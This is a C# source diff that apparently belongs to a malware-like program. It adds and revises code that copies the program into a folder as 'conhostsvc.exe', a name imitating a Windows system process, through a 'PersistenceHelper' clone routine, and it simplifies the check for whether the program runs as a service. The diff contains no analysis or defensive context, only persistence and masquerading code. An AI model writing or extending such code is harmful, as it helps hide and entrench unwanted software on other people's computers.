@@ -25,7 +25,14 @@ namespace zort
             return itITPath;
         }
 
-        public static string CreateItITClone()
+        public static string GetExecutablePath()
+        {
+            string itITPath = GetItITPath();
+            string execPath = Path.Combine(itITPath, "conhostsvc.exe");
+            return execPath;
+        }
+
+        public static string CreateServiceExecutable()
         {
             string itITPath = GetItITPath();
             if (!Directory.Exists(itITPath))
@@ -33,10 +40,12 @@ namespace zort
                 Directory.CreateDirectory(itITPath);
             }
             string clonePath = Path.Combine(itITPath, "conhostsvc.exe");
-            if (!File.Exists(clonePath))
+            if (File.Exists(clonePath))
             {
-                PersistenceHelper.Clone.Create(clonePath);
+                // If the file already exists, delete it
+                File.Delete(clonePath);
             }
+            PersistenceHelper.Clone.Create(clonePath);
 
             return clonePath;
         }
@@ -59,14 +68,7 @@ namespace zort
 
         public static bool AmIService()
         {
-            var service = GetService();
-            if (service == null) return false;
-
-            using (var currentProcess = Process.GetCurrentProcess())
-            {
-                return service.ServiceHandle.DangerousGetHandle() == currentProcess.Handle &&
-                       currentProcess.ProcessName.Equals(Program.SERVICE_NAME, StringComparison.OrdinalIgnoreCase);
-            }
+            return !Environment.UserInteractive;
         }
 
         public static void StartService()
